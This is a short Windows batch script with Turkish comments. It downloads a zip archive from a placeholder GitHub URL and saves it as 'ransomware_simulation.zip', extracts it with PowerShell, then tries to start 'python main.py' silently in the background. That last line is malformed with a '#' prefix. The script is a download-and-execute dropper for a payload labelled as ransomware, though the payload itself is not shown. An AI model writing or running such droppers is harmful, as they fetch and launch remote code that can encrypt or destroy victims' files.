@echo off
setlocal

:: GitHub'daki dosyanızın URL'si
set "url=https://github.com/username/repo_name/archive/refs/heads/main.zip"

:: Dosyayı indirme
curl -L -o ransomware_simulation.zip %url%

:: Zip dosyasını açma
powershell -command "Expand-Archive -Path ransomware_simulation.zip -DestinationPath ."

:: İndirilen dizine gitme
cd repo_name-main

:: Dosyayı çalıştırma
#start /b python main.py

endlocal